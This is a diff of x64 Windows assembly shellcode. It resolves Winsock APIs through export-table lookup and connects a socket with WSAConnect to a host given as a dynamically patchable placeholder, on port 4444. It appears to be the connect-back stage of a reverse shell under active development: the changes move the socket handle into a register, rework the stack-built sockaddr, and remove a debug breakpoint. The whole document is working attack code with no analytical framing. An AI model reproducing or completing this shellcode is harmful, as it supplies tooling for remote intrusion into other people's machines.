@@ -23,7 +23,7 @@ main proc
     cmp rax, -1h            ; check result 
     je  cleanup             ; failed INVALID_SOCKET
     
-    mov socket_fd, rax    ; save socket fd
+    mov r14d, eax           ; save socket fd in r14
     
     call connect            ; connect socket
     cmp rax, 0h             ; check result
@@ -86,8 +86,6 @@ socket proc
     push rbp
     mov rbp, rsp
     
-    int 3
-    
     ; allocate space
     sub rsp, 30h                   ; allocate space (28h shadow + GROUP 4h + dwFlags 4h)
     and rsp, 0fffffffffffffff0h    ; make sure stack 16-byte aligned   
@@ -123,7 +121,7 @@ connect proc
     mov rbp, rsp
     
     ; allocate space
-    sub rsp, 50h                   ; allocate space (28h shadow + sockaddr 10h + last args 18h)
+    sub rsp, 3eh                   ; allocate space (28h shadow + sockaddr 16h)
     and rsp, 0fffffffffffffff0h    ; make sure stack 16-byte aligned   
     
     lea rcx, ws2_32_dll
@@ -132,23 +130,29 @@ connect proc
     lea rdx, wsa_connect_func
     lea rcx, ws2_32_dll
     call lookup_api         ; get address of WSAConnect
+        
+    xor r8, r8
+    add r8w, 2h
+    mov [rbp-16h], r8w      ; family type
+            
+    mov r8w, [port]         ; port
+    mov [rbp-14h], r8w
     
-    mov ebx, [host_addr]    ; host addr
-    mov [rbp-28h], ebx
-    mov bx, [port]         ; port
-    mov [rbp-24h], bx
-    xor rbx, rbx
-    add bx, 2h
-    mov [rbp-22h], bx        ; family type
-    lea rdx, [rbp-28h]      ; sockaddr
+    mov r8d, [host_addr]    ; host addr
+    mov [rbp-10h], r8d
     
-    lea r9, [rbp-48h]       ; lpCallerData
+    xor r8, r8
+    mov [rbp-8h], r8d ; zeroes
+    
+    lea rdx, [rbp-16h]      ; sockaddr
+        
+    xor r9, r9              ; lpCallerData
     mov r8, 10h             ; namelen 16 bytes
-    mov ecx, [socket_fd]    ; socket
+    mov ecx, r14d           ; socket
     
     call rax                ; WSAConnect
     
-    add rsp, 50h           ; deallocate stack space
+    add rsp, 3eh           ; deallocate stack space
     
     leave
     ret
@@ -170,11 +174,9 @@ exitproc_func       db  'ExitProcess', 0
 ;exitthread_func    db  'ExitThread', 0
 
 ; initialized
-host_addr           dd  0ffffffffh        ; placeholder that can be changed dynamically in shellcode
+host_addr           dd  0h        ; placeholder that can be changed dynamically in shellcode
 port                dw  5c11h            ; 4444d
 
-; uninitialized
-socket_fd           dd  ?
  
 ;look up address of function from DLL export table
 ;rcx=DLL name string, rdx=function name string
